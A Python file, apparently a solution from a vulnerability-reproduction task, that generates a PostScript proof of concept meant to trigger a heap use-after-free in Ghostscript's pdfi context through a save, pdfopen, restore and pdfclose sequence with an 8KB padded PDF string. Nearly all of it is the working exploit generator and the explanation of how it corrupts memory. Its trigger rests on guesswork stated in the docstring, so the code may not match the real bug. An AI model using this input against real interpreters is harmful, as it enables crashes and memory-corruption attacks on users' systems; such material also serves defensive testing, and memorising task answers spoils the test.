import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a heap use-after-free vulnerability.

        The vulnerability is described as "a pdfi context with no stream is used"
        when "setting the pdfi input stream from Postscript fails". This suggests
        a sequence of Postscript operations that leaves a PDF context in an
        inconsistent state.

        A classic cause for such issues in Postscript interpreters like Ghostscript
        is the interaction of file/stream operations with `save` and `restore`.
        The `restore` operator reverts the interpreter's state, including closing
        any files or streams that were opened after the corresponding `save`. If a
        handle to an object (like a PDF context) that refers to such a stream
        survives the `restore`, it will contain a dangling pointer to the now-closed
        stream resources. A subsequent operation using this zombie object can
        trigger a use-after-free.

        This PoC implements that pattern:
        1.  A dictionary is created to hold a reference to an object, ensuring it
            survives the `restore` operation.
        2.  `save` is called to create a snapshot of the interpreter state.
        3.  The `pdfopen` operator is used to create a PDF context from a string.
            This context object contains a pointer to an underlying stream that
            reads from the string. To make a heap-based UAF more likely (by
            avoiding small buffer optimizations), the string is made large (~8KB).
        4.  The newly created PDF context object is stored in the dictionary.
        5.  `restore` is called. This reverts the state, which includes closing
            the stream associated with the PDF context. The context object itself,
            referenced from our dictionary, still exists but now has a dangling
            pointer to the freed stream resources.
        6.  The zombie context object is retrieved from the dictionary.
        7.  The `pdfclose` operator is called on the zombie context. This operator
            attempts to access the stream resources to clean them up, but since
            they have already been freed, it dereferences a dangling pointer,
            triggering the UAF and crashing the application.
        """
        # A minimal, valid PDF file structure.
        pdf_base_content = b"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
xref
0 4
0000000000 65535 f 
0000000010 00000 n 
0000000059 00000 n 
0000000118 00000 n 
trailer
<< /Size 4 /Root 1 0 R >>
startxref
199
%%EOF
"""
        
        # Add padding to the PDF content. This increases the likelihood that the
        # underlying stream buffer is allocated on the heap rather than the stack
        # or a small-object pool, which is often necessary for this class of UAF.
        # An 8KB padding is a reasonable size to exceed typical thresholds.
        padding_len = 8192
        padding = b'%' + b'A' * (padding_len - 2) + b'\n'
        
        large_pdf_content = padding + pdf_base_content
        
        # The PDF content will be embedded in a Postscript string literal `(...)`.
        # We must escape special characters: `\`, `(`, `)`.
        escaped_pdf_content = large_pdf_content.replace(b'\\', b'\\\\').replace(b'(', b'\\(').replace(b')', b'\\)')

        # The Postscript code that orchestrates the vulnerability trigger.
        poc_template = b"""%!PS
/pocdict 1 dict def
pocdict begin /ctx null def end
save
(%s) pdfopen
pocdict /ctx exch def
restore
pocdict /ctx get
pdfclose
"""
        
        poc = poc_template % escaped_pdf_content
        
        return poc
